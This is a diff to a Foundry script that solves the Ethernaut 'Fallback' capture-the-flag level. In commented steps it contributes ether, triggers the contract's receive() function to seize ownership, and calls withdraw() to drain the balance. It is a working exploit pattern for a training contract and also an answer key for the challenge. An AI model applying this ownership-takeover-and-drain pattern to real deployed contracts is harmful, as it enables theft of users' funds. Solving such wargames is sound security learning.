@@ -16,11 +16,31 @@ contract FallbackSolution is Script, EthernautHelper {
         // NOTE this is the address of your challenge contract
         address challengeInstance = createInstance(LEVEL_ADDRESS);
 
-        // YOUR SOLUTION HERE
-        Fallback(payable(challengeInstance)).contribute{value:0.0001 ether}();
-        (bool success, ) = payable(challengeInstance).call{value:1 wei}("");
-        require(success, "Transfer failed.");
-        Fallback(payable(challengeInstance)).withdraw();
+        // Ric Li C's Solution
+        Fallback challenge = Fallback(payable(challengeInstance));
+
+        // 1. Get balance of calling address, make sure it has enough ether before calling
+        address heroAddress = vm.addr(heroPrivateKey);
+        uint256 balance = address(heroAddress).balance;
+        console2.log("Balance of address:", heroAddress, "is", balance);
+
+        // 2. Call contribute() function to make `contributions[msg.sender] > 0`;
+        challenge.contribute{value: 0.0008 ether}();
+
+        // 3. Send ether to invoke `receive()` function;
+        // Since `receive()` function has extra logic, gas MUST be increased to make transfer successfully.
+        (bool success, ) = challengeInstance.call{
+            value: 0.001 ether,
+            gas: 300000
+        }("");
+        require(success, "Transfer failed");
+
+        // 4. Confirm that `heroAddress` have become owner of the contract.
+        // assertEq(heroAddress, challenge.owner(), "Owner check failed");  // assertEq is only available in test scripts
+        require(heroAddress == challenge.owner(), "Owner check failed");
+
+        // 5. Drain contract balance.
+        challenge.withdraw();
 
         // SUBMIT CHALLENGE. (DON'T EDIT)
         bool levelSuccess = submitInstance(challengeInstance);
